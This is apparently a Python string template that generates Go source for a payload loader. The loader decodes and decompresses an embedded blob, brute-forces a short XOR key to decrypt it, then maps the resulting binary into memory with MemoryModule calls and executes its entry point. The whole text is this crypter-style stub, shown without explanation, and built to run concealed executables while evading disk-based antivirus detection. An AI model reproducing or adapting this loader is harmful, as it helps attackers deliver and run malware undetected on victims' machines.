loader="""
package main

import "C"
import (
    "bytes"
    "encoding/binary"
    "encoding/base64"
    "compress/zlib"
    "io"

    "unsafe"
    "os"
)

func bf_xor(block []byte, known_bytes []byte) []byte {{
    encrypted := block[0:1000]
    decrypted := make([]byte, len(encrypted))
    key := make([]byte, 4)
    var k uint32 = 0
    for {{
        binary.LittleEndian.PutUint32(key, k)
        for i, ch := range encrypted {{
            decrypted[i] = (ch ^ (key[i % len(key)]))
        }}
        if bytes.Compare(decrypted[128:132], known_bytes) == 0 {{
            if len(decrypted) == len(block) {{
                break
            }} else {{
                encrypted = block
                decrypted = make([]byte, len(block))
            }}
        }} else {{
            k += 1
        }}
    }}
    return decrypted
}}

func main() {{
    compressed, _ := base64.StdEncoding.DecodeString("{0}")
    known_bytes, _ := base64.StdEncoding.DecodeString("{1}")
    var b1, b2 bytes.Buffer
    b1.Write([]byte(compressed))
    r, _ := zlib.NewReader(&b1)
    io.Copy(&b2, r)
    r.Close()
    encrypted := b2.Bytes()
    payload := bf_xor(encrypted, known_bytes)

    var cArgs []*C.char
    for _, goString := range os.Args {{
        cArgs = append(cArgs, C.CString(goString))
    }}
    handle := C.MemoryLoadLibraryEx(unsafe.Pointer(&payload[0]),
                                    (C.size_t)(len(payload)),
                                    (*[0]byte)(C.MemoryDefaultAlloc),
                                    (*[0]byte)(C.MemoryDefaultFree),
                                    (*[0]byte)(C.MemoryDefaultLoadLibrary),
                                    (*[0]byte)(C.MemoryDefaultGetProcAddress),
                                    (*[0]byte)(C.MemoryDefaultFreeLibrary),
                                    unsafe.Pointer(nil),
    )
    C.MemoryCallEntryPoint(handle)
    C.MemoryFreeLibrary(handle)
}}
"""
